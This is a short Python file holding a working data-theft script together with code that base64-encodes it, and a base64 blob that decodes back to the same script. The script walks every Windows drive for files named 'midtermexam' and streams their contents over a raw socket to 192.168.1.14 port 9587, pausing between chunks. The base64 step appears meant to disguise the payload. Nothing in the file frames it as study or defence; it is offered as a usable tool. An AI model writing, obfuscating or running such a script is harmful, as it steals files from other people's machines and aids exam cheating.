import base64

encode = """
# -*- coding: utf-8 -*-
import os
import re
import socket
import hashlib
import time

drives = os.popen('wmic logicaldisk get caption')
drives = [drive.strip() for drive in drives if drive.strip()]
exam_file_list = []
for drive in drives:
    path = os.path.join(drive, "\\\\")
    for dirPath, dirNames, fileNames in os.walk(path):
        for file in fileNames:
            if re.search("midtermexam", os.path.join(dirPath, file)) and not file.endswith('.lnk'):
                exam_file_list.append(os.path.join(dirPath, file))
exam_file_list = [elem for elem in exam_file_list if not elem.startswith('\\\\')]
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("192.168.1.14", 9587))
hash_dict = {}
for exam_file in exam_file_list:
    with open(exam_file, "rb") as f:
        md5 = hashlib.md5(f.read()).hexdigest()
    if md5 in hash_dict:
        continue
    file_size = os.path.getsize(exam_file)
    client_socket.sendall(f"{os.path.basename(exam_file)}\\n{file_size}".encode())
    with open(exam_file, "rb") as f:
        while True:
            data = f.read(1048576)
            if not data:
                break
            client_socket.sendall(data)
            time.sleep(2)
    hash_dict[md5] = exam_file
client_socket.sendall(b"over")
client_socket.close()
"""

# Convert code to bytes and encode using Base64
blob = base64.b64encode(encode.encode('utf-8')).decode('utf-8')
# Print the encoded string
print(blob)

decode = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQoKZHJpdmVzID0gb3MucG9wZW4oJ3dtaWMgbG9naWNhbGRpc2sgZ2V0IGNhcHRpb24nKQpkcml2ZXMgPSBbZHJpdmUuc3RyaXAoKSBmb3IgZHJpdmUgaW4gZHJpdmVzIGlmIGRyaXZlLnN0cmlwKCldCmV4YW1fZmlsZV9saXN0ID0gW10KZm9yIGRyaXZlIGluIGRyaXZlczoKICAgIHBhdGggPSBvcy5wYXRoLmpvaW4oZHJpdmUsICJcXCIpCiAgICBmb3IgZGlyUGF0aCwgZGlyTmFtZXMsIGZpbGVOYW1lcyBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVOYW1lczoKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCJtaWR0ZXJtZXhhbSIsIG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkgYW5kIG5vdCBmaWxlLmVuZHN3aXRoKCcubG5rJyk6CiAgICAgICAgICAgICAgICBleGFtX2ZpbGVfbGlzdC5hcHBlbmQob3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKQpleGFtX2ZpbGVfbGlzdCA9IFtlbGVtIGZvciBlbGVtIGluIGV4YW1fZmlsZV9saXN0IGlmIG5vdCBlbGVtLnN0YXJ0c3dpdGgoJ1xcJyldCmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS4xNCIsIDk1ODcpKQpoYXNoX2RpY3QgPSB7fQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIGlmIG1kNSBpbiBoYXNoX2RpY3Q6CiAgICAgICAgY29udGludWUKICAgIGZpbGVfc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShleGFtX2ZpbGUpCiAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZiJ7b3MucGF0aC5iYXNlbmFtZShleGFtX2ZpbGUpfVxue2ZpbGVfc2l6ZX0iLmVuY29kZSgpKQogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKDEwNDg1NzYpCiAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgY2xpZW50X3NvY2tldC5zZW5kYWxsKGRhdGEpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgIGhhc2hfZGljdFttZDVdID0gZXhhbV9maWxlCmNsaWVudF9zb2NrZXQuc2VuZGFsbChiIm92ZXIiKQpjbGllbnRfc29ja2V0LmNsb3NlKCkK"
decoded = base64.b64decode(decode).decode("UTF-8")
print(decoded)
